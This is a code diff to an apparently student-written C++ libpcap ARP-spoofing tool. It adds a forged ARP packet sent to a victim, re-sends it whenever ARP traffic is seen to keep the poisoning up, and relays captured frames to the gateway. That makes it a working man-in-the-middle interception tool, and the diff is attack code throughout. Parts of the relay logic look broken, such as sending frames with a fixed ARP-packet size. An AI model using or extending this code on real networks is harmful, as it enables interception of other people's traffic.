@@ -77,6 +77,7 @@ int main(int argc, char* argv[]) {
     Ip t_ip(argv[3]);
 
     EthArpPacket packet;
+    EthArpPacket attack_packet;
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
@@ -161,8 +162,10 @@ int main(int argc, char* argv[]) {
     //victim mac is defined
     packet.arp_.tip_ = htonl(s_ip);  //victim ip
 
+    attack_packet = packet;
+
     //attack packet
-    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
@@ -189,12 +192,19 @@ int main(int argc, char* argv[]) {
 
             //if get ARP packet from ???? than we attack again
             if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP){
-                //attack packet
+                //attack packet to victim
+                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
+                if (res != 0) {
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                }
+                //attack packet to gateway (10.2 is attacker mac)
+                /*
                 res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                 if (res != 0) {
                     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 }
                 continue;
+                */
             }
 
             if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP){
@@ -219,11 +229,10 @@ int main(int argc, char* argv[]) {
            }
 
            //make relay packetS
-           packet.arp_.tmac_ = Mac(MAC_GATEWAY);
-           packet.eth_.dmac_ = Mac(MAC_GATEWAY);
+           memcpy(eth_hdr->ether_dhost, &MAC_GATEWAY, ETHER_ADDR_LEN);
 
            //relay to gateway
-           res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&out_packet), sizeof(EthArpPacket));
+           res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(eth_hdr), sizeof(EthArpPacket));
            printf("%u bytes relayed to gateway\n", header->caplen);
 
            if (res != 0) {
